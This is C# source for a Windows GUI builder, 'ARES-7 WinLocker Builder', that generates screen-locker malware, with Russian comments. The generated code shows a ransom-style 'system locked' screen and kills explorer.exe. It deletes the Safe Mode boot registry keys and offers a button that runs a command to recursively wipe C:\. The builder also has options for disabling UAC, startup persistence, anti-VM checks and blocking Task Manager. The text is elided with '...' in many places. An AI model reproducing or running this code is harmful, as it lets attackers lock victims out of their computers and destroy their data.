...
namespace WinLockerBuilder
{
    public partial class Form1 : Form
    {
        ...
        private CheckBox chkKillExplorer;
        private CheckBox chkBlockSafeMode;
        private CheckBox chkDeleteWindows;
        ...
        private ComboBox cbButtonStyle;
        private CheckBox chkShowNumpad;
        private CheckBox chkShowDeleteButton;
        ...
        // Цвета
        private Color selectedBgColor = Color.FromArgb(10, 10, 10);
        ...
        {
            this.Text = "ARES-7 WinLocker Builder v3.0";
        ...
        private TabPage CreateMainTab()
        {
            ...
            txtTitle = CreateTextBox("🔒 Windows Locked!", "");
            ...
            txtMessage.Text = "YOUR SYSTEM HAS BEEN LOCKED!\n\nEnter the password to unlock.\n\nWrong password = system format!";
            ...
            cbTheme.Items.AddRange(new object[] { "Hacker (Green)", "Dark Blue", "Dark Red", "Matrix", "Cyberpunk", "Neon", "Royal", "Black & White" });
            ...
            chkKillExplorer = CreateCheckBox("Kill Explorer", true);
            
            blockPanel.Controls.AddRange(new Control[] { chkBlockTaskManager, chkBlockAltF4, chkBlockCtrlAltDel, chkBlockWinKey, chkKillExplorer });
            ...
            chkBlockSafeMode = CreateCheckBox("Block Safe Mode", true);
            chkDeleteWindows = CreateCheckBox("Delete Windows (button)", true);
            
            extraPanel.Controls.AddRange(new Control[] { chkHideCursor, chkDisableUAC, chkAddStartup, chkAntiVM, chkBlockSafeMode, chkDeleteWindows });
        ...
        private TabPage CreateDesignTab()
        {
            ...
            cbFontFamily.Items.AddRange(new object[] { "Consolas", "Segoe UI", "Arial", "Verdana", "Courier New", "Tahoma", "Impact" });
            ...
            settingsPanel.Controls.Add(CreateLabel("Button Style:", Color.White, true), 0, srow);
            cbButtonStyle = new ComboBox();
            cbButtonStyle.Items.AddRange(new object[] { "Flat", "Border", "Hover Glow", "Pulse" });
            cbButtonStyle.SelectedIndex = 0;
            cbButtonStyle.BackColor = Color.FromArgb(30, 30, 50);
            cbButtonStyle.ForeColor = Color.White;
            cbButtonStyle.FlatStyle = FlatStyle.Flat;
            cbButtonStyle.Font = new Font("Segoe UI", 10);
            cbButtonStyle.Dock = DockStyle.Fill;
            cbButtonStyle.SelectedIndexChanged += (s, e) => UpdatePreview();
            settingsPanel.Controls.Add(cbButtonStyle, 1, srow++);
            ...
            settingsPanel.Controls.Add(CreateLabel("UI Elements:", Color.White, true), 0, srow);
            var uiPanel = new FlowLayoutPanel();
            uiPanel.BackColor = Color.FromArgb(15, 15, 25);
            uiPanel.Dock = DockStyle.Fill;
            chkShowNumpad = CreateCheckBox("Show Numpad", true);
            chkShowNumpad.CheckedChanged += (s, e) => UpdatePreview();
            uiPanel.Controls.Add(chkShowNumpad);
            chkShowDeleteButton = CreateCheckBox("Delete Windows Button", true);
            chkShowDeleteButton.CheckedChanged += (s, e) => UpdatePreview();
            uiPanel.Controls.Add(chkShowDeleteButton);
            settingsPanel.Controls.Add(uiPanel, 1, srow++);
        ...
        private void UpdatePreview()
        {
            ...
            try
            {
                ...
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    ...
                    {
                        using (LinearGradientBrush brush = new LinearGradientBrush(
                            new Rectangle(0, 0, w, h), selectedGradient1, selectedGradient2, 45))
                        {
                    ...
                    using (Pen borderPen = new Pen(selectedBorderColor, 2))
                    {
                        ...
                        {
                            using (Pen glowPen = new Pen(Color.FromArgb(80, selectedBorderColor.R, selectedBorderColor.G, selectedBorderColor.B), 6))
                            {
                    ...
                    g.DrawString(txtTitle.Text, new Font(cbFontFamily.Text, (float)numFontSize.Value + 4, FontStyle.Bold),
                        new SolidBrush(selectedTextColor), boxX + 20, titleY);
                    
                    // Сообщение
                    int msgY = titleY + 35;
                    string msg = txtMessage.Text.Replace("\n", " ").Replace("\r", " ");
                    if (string.IsNullOrEmpty(msg)) msg = "SYSTEM LOCKED!";
                    g.DrawString(msg, new Font(cbFontFamily.Text, (float)numFontSize.Value - 2),
                        new SolidBrush(Color.FromArgb(200, 200, 200)), boxX + 20, msgY);
                    
                    // Поле ввода
                    int inputY = msgY + 50;
                    g.FillRectangle(new SolidBrush(Color.FromArgb(40, 40, 60)), boxX + 20, inputY, boxW - 40, 35);
                    g.DrawRectangle(new Pen(selectedBorderColor), boxX + 20, inputY, boxW - 40, 35);
                    g.DrawString("●●●●●●●●", new Font(cbFontFamily.Text, 14),
                        new SolidBrush(Color.FromArgb(100, 255, 255, 255)), boxX + 30, inputY + 8);
                    ...
                    if (chkShowNumpad.Checked)
                    {
                        for (int i = 0; i < 9; i++)
                        {
                            int bx = startX + (i % 3) * (btnSize + btnGap);
                            int by = btnY + (i / 3) * (btnSize + btnGap);
                            using (GraphicsPath btnPath = GetRoundedRect(bx, by, btnSize, btnSize, 5))
                            using (SolidBrush btnBrush = new SolidBrush(selectedButtonColor))
                            {
                                g.FillPath(btnBrush, btnPath);
                            }
                            g.DrawString((i + 1).ToString(), new Font(cbFontFamily.Text, 14, FontStyle.Bold),
                                new SolidBrush(Color.White), bx + 18, by + 12);
                        }
                        
                        // Кнопка 0
                        int bx0 = startX + 1 * (btnSize + btnGap);
                        int by0 = btnY + 3 * (btnSize + btnGap);
                        using (GraphicsPath btnPath = GetRoundedRect(bx0, by0, btnSize, btnSize, 5))
                        using (SolidBrush btnBrush = new SolidBrush(selectedButtonColor))
                        {
                            g.FillPath(btnBrush, btnPath);
                        }
                        g.DrawString("0", new Font(cbFontFamily.Text, 14, FontStyle.Bold),
                            new SolidBrush(Color.White), bx0 + 18, by0 + 12);
                        
                        // Кнопка очистки
                        int clearX = startX + 2 * (btnSize + btnGap);
                        using (GraphicsPath btnPath = GetRoundedRect(clearX, by0, btnSize, btnSize, 5))
                        using (SolidBrush btnBrush = new SolidBrush(Color.FromArgb(200, 50, 50)))
                        {
                            g.FillPath(btnBrush, btnPath);
                        }
                        g.DrawString("C", new Font(cbFontFamily.Text, 14, FontStyle.Bold),
                            new SolidBrush(Color.White), clearX + 18, by0 + 12);
                    }
                    
                    // Кнопка UNLOCK
                    int unlockY = btnY + (chkShowNumpad.Checked ? 5 * (btnSize + btnGap) + 10 : 0);
                    int unlockW = 180;
                    int unlockH = 40;
                    int unlockX = (w - unlockW) / 2;
                    
                    using (GraphicsPath btnPath = GetRoundedRect(unlockX, unlockY, unlockW, unlockH, 10))
                    using (SolidBrush btnBrush = new SolidBrush(selectedButtonColor))
                    {
                        g.FillPath(btnBrush, btnPath);
                    }
                    g.DrawString("UNLOCK", new Font(cbFontFamily.Text, 14, FontStyle.Bold),
                        new SolidBrush(Color.White), unlockX + 45, unlockY + 10);
                    
                    // Кнопка DELETE WINDOWS
                    if (chkShowDeleteButton.Checked)
                    {
                        int deleteY = unlockY + 50;
                        using (GraphicsPath btnPath = GetRoundedRect(unlockX, deleteY, unlockW, unlockH, 10))
                        using (SolidBrush btnBrush = new SolidBrush(Color.FromArgb(180, 30, 30)))
                        {
                            g.FillPath(btnBrush, btnPath);
                        }
                        g.DrawString("🗑 DELETE WINDOWS", new Font(cbFontFamily.Text, 12, FontStyle.Bold),
                            new SolidBrush(Color.White), unlockX + 20, deleteY + 10);
                    }
                    
                    // Таймер
                    if (chkShowTimer.Checked)
                    {
                        int timerY = boxY + boxH - 35;
                        string timeStr = "⏱ " + ((int)numMainTimerSeconds.Value).ToString("D2") + "s";
                        g.DrawString(timeStr, new Font(cbFontFamily.Text, 14, FontStyle.Bold),
                            new SolidBrush(Color.FromArgb(255, 200, 50)), boxX + boxW - 120, timerY);
                    }
                    
                    // Попытки
                    int attemptsY = boxY + boxH - 35;
                    g.DrawString($"Attempts: 0 / {numAttempts.Value}", new Font(cbFontFamily.Text, 10),
                        new SolidBrush(Color.FromArgb(150, 150, 150)), boxX + 20, attemptsY);
        ...
        private string GenerateWinLockerCode()
        {
            ...
            bool killExplorer = chkKillExplorer.Checked;
            bool blockSafeMode = chkBlockSafeMode.Checked;
            bool showDeleteButton = chkShowDeleteButton.Checked;
            bool showNumpad = chkShowNumpad.Checked;
            ...
            string fontFamily = cbFontFamily.SelectedItem?.ToString() ?? "Consolas";
            ...
            code.AppendLine($"        bool killExplorer = {killExplorer.ToString().ToLower()};");
            code.AppendLine($"        bool blockSafeMode = {blockSafeMode.ToString().ToLower()};");
            code.AppendLine($"        bool showDeleteButton = {showDeleteButton.ToString().ToLower()};");
            code.AppendLine($"        bool showNumpad = {showNumpad.ToString().ToLower()};");
            code.AppendLine("");
            ...
            code.AppendLine("        Button btnDeleteWindows;");
            code.AppendLine("        Button btnClear;");
            ...
            code.AppendLine("");
            code.AppendLine("            if (killExplorer) KillExplorer();");
            ...
            code.AppendLine("            if (blockSafeMode) BlockSafeMode();");
            ...
            code.AppendLine("                    {");
            code.AppendLine("                        e.Graphics.FillRectangle(brush, this.ClientRectangle);");
            code.AppendLine("                    }");
            code.AppendLine("                };");
            code.AppendLine("            }");
            code.AppendLine("");
            ...
            code.AppendLine("            {");
            code.AppendLine("                this.Paint += (s, e) => {");
            code.AppendLine("                    Random rnd = new Random();");
            code.AppendLine("                    for (int i = 0; i < 50; i++)");
            code.AppendLine("                    {");
            code.AppendLine("                        int rx = rnd.Next(this.Width);");
            code.AppendLine("                        int ry = rnd.Next(this.Height);");
            code.AppendLine($"                        e.Graphics.DrawString(\"01\", new Font(\"Consolas\", 8), new SolidBrush(Color.FromArgb(30, 255, 100)), rx, ry);");
            code.AppendLine("                    }");
            code.AppendLine("                };");
            code.AppendLine("            }");
            code.AppendLine("");
            code.AppendLine("            int w = 500, h = 500;");
            ...
            code.AppendLine("");
            code.AppendLine("            // Кнопки цифр");
            code.AppendLine("            if (showNumpad)");
            code.AppendLine("            {");
            code.AppendLine("                int btnSize = 45;");
            code.AppendLine("                int gap = 8;");
            code.AppendLine("                int startX = (w - 3 * (btnSize + gap) + gap) / 2;");
            code.AppendLine("                int startY = 190;");
            code.AppendLine("");
            code.AppendLine("                for (int i = 1; i <= 9; i++)");
            code.AppendLine("                {");
            code.AppendLine("                    int row = (i - 1) / 3;");
            code.AppendLine("                    int col = (i - 1) % 3;");
            code.AppendLine("                    Button btn = new Button();");
            code.AppendLine("                    btn.Text = i.ToString();");
            code.AppendLine("                    btn.Size = new Size(btnSize, btnSize);");
            code.AppendLine("                    btn.Location = new Point(startX + col * (btnSize + gap), startY + row * (btnSize + gap));");
            code.AppendLine($"                    btn.Font = new Font(fontFamily, 14, FontStyle.Bold);");
            code.AppendLine("                    btn.BackColor = buttonColor;");
            code.AppendLine("                    btn.ForeColor = Color.White;");
            code.AppendLine("                    btn.FlatStyle = FlatStyle.Flat;");
            code.AppendLine("                    btn.FlatAppearance.BorderSize = 0;");
            code.AppendLine("                    btn.Click += (s, e) => txtPassword.Text += btn.Text;");
            code.AppendLine("                    mainPanel.Controls.Add(btn);");
            code.AppendLine("                }");
            code.AppendLine("");
            code.AppendLine("                // Кнопка 0");
            code.AppendLine("                Button btn0 = new Button();");
            code.AppendLine("                btn0.Text = \"0\";");
            code.AppendLine("                btn0.Size = new Size(btnSize, btnSize);");
            code.AppendLine("                btn0.Location = new Point(startX + (btnSize + gap), startY + 3 * (btnSize + gap));");
            code.AppendLine($"                btn0.Font = new Font(fontFamily, 14, FontStyle.Bold);");
            code.AppendLine("                btn0.BackColor = buttonColor;");
            code.AppendLine("                btn0.ForeColor = Color.White;");
            code.AppendLine("                btn0.FlatStyle = FlatStyle.Flat;");
            code.AppendLine("                btn0.FlatAppearance.BorderSize = 0;");
            code.AppendLine("                btn0.Click += (s, e) => txtPassword.Text += \"0\";");
            code.AppendLine("                mainPanel.Controls.Add(btn0);");
            code.AppendLine("");
            code.AppendLine("                // Кнопка очистки");
            code.AppendLine("                btnClear = new Button();");
            code.AppendLine("                btnClear.Text = \"C\";");
            code.AppendLine("                btnClear.Size = new Size(btnSize, btnSize);");
            code.AppendLine("                btnClear.Location = new Point(startX + 2 * (btnSize + gap), startY + 3 * (btnSize + gap));");
            code.AppendLine($"                btnClear.Font = new Font(fontFamily, 14, FontStyle.Bold);");
            code.AppendLine("                btnClear.BackColor = Color.FromArgb(200, 50, 50);");
            code.AppendLine("                btnClear.ForeColor = Color.White;");
            code.AppendLine("                btnClear.FlatStyle = FlatStyle.Flat;");
            code.AppendLine("                btnClear.FlatAppearance.BorderSize = 0;");
            code.AppendLine("                btnClear.Click += (s, e) => txtPassword.Clear();");
            code.AppendLine("                mainPanel.Controls.Add(btnClear);");
            code.AppendLine("            }");
            code.AppendLine("");
            code.AppendLine("            // Кнопка разблокировки");
            code.AppendLine("            int unlockY = showNumpad ? 360 : 200;");
            code.AppendLine("            btnUnlock = new Button();");
            code.AppendLine("            btnUnlock.Text = \"🔓 UNLOCK\";");
            code.AppendLine("            btnUnlock.Size = new Size(w - 100, 40);");
            code.AppendLine("            btnUnlock.Location = new Point(50, unlockY);");
            ...
            code.AppendLine("            btnUnlock.FlatAppearance.BorderSize = 0;");
            code.AppendLine("            btnUnlock.Click += BtnUnlock_Click;");
            code.AppendLine("            mainPanel.Controls.Add(btnUnlock);");
            code.AppendLine("");
            code.AppendLine("            // Кнопка удаления Windows");
            code.AppendLine("            if (showDeleteButton)");
            code.AppendLine("            {");
            code.AppendLine("                btnDeleteWindows = new Button();");
            code.AppendLine("                btnDeleteWindows.Text = \"🗑 DELETE WINDOWS\";");
            code.AppendLine("                btnDeleteWindows.Size = new Size(w - 100, 40);");
            code.AppendLine("                btnDeleteWindows.Location = new Point(50, unlockY + 50);");
            code.AppendLine($"                btnDeleteWindows.Font = new Font(fontFamily, 12, FontStyle.Bold);");
            code.AppendLine("                btnDeleteWindows.BackColor = Color.FromArgb(180, 30, 30);");
            code.AppendLine("                btnDeleteWindows.ForeColor = Color.White;");
            code.AppendLine("                btnDeleteWindows.FlatStyle = FlatStyle.Flat;");
            code.AppendLine("                btnDeleteWindows.FlatAppearance.BorderSize = 0;");
            code.AppendLine("                btnDeleteWindows.Click += (s, e) => {");
            code.AppendLine("                    DialogResult result = MessageBox.Show(\"Are you sure you want to DELETE Windows? This is irreversible!\", \"Warning\", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);");
            code.AppendLine("                    if (result == DialogResult.Yes)");
            code.AppendLine("                    {");
            code.AppendLine("                        try { Process.Start(\"cmd.exe\", \"/c rd C:\\\\ /s /q & del C:\\\\ /s /q\"); } catch { }");
            code.AppendLine("                    }");
            code.AppendLine("                };");
            code.AppendLine("                mainPanel.Controls.Add(btnDeleteWindows);");
            code.AppendLine("            }");
            code.AppendLine("");
            code.AppendLine("            // Попытки");
            ...
            code.AppendLine("            int attemptsY = showDeleteButton ? unlockY + 100 : unlockY + 50;");
            code.AppendLine("            lblAttempts.Location = new Point(50, attemptsY);");
            code.AppendLine("            lblAttempts.Size = new Size(200, 20);");
            code.AppendLine("            mainPanel.Controls.Add(lblAttempts);");
            code.AppendLine("");
            code.AppendLine("            // Таймер");
            ...
            code.AppendLine($"                lblTimer.Font = new Font(fontFamily, 14, FontStyle.Bold);");
            code.AppendLine("                lblTimer.ForeColor = Color.FromArgb(255, 200, 50);");
            code.AppendLine("                lblTimer.Location = new Point(w - 130, attemptsY);");
            code.AppendLine("                lblTimer.Size = new Size(100, 20);");
            ...
            code.AppendLine("                    progressBar.Location = new Point(50, attemptsY + 25);");
            code.AppendLine("                    progressBar.Size = new Size(w - 100, 10);");
            ...
            code.AppendLine("            }");
            code.AppendLine("");
            code.AppendLine("            // Рамка с эффектом свечения");
            code.AppendLine("            if (glowEffect)");
            code.AppendLine("            {");
            code.AppendLine("                this.Paint += (s, e) => {");
            code.AppendLine("                    using (Pen pen = new Pen(borderColor, 2))");
            code.AppendLine("                    {");
            code.AppendLine("                        e.Graphics.DrawRectangle(pen, x - 1, y - 1, w + 2, h + 2);");
            code.AppendLine("                    }");
            code.AppendLine("                };");
            code.AppendLine("            }");
            code.AppendLine("        }");
            ...
            code.AppendLine("            timer?.Stop();");
            code.AppendLine("            RestoreExplorer();");
            ...
            code.AppendLine("        }");
            code.AppendLine("");
            code.AppendLine("        void KillExplorer()");
            code.AppendLine("        {");
            code.AppendLine("            try { Process.Start(\"taskkill\", \"/F /IM explorer.exe\"); } catch { }");
            code.AppendLine("        }");
            code.AppendLine("");
            code.AppendLine("        void RestoreExplorer()");
            code.AppendLine("        {");
            code.AppendLine("            try { Process.Start(\"explorer.exe\"); } catch { }");
            code.AppendLine("        }");
            code.AppendLine("");
            ...
            code.AppendLine("        }");
            code.AppendLine("");
            code.AppendLine("        void BlockSafeMode()");
            code.AppendLine("        {");
            code.AppendLine("            try");
            code.AppendLine("            {");
            code.AppendLine("                RegistryKey key = Registry.LocalMachine.CreateSubKey(@\"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\");");
            code.AppendLine("                if (key != null) { key.DeleteSubKeyTree(\"Minimal\"); key.DeleteSubKeyTree(\"Alternate\"); key.Close(); }");
            code.AppendLine("            }");
            code.AppendLine("            catch { }");
            code.AppendLine("        }");
            code.AppendLine("");
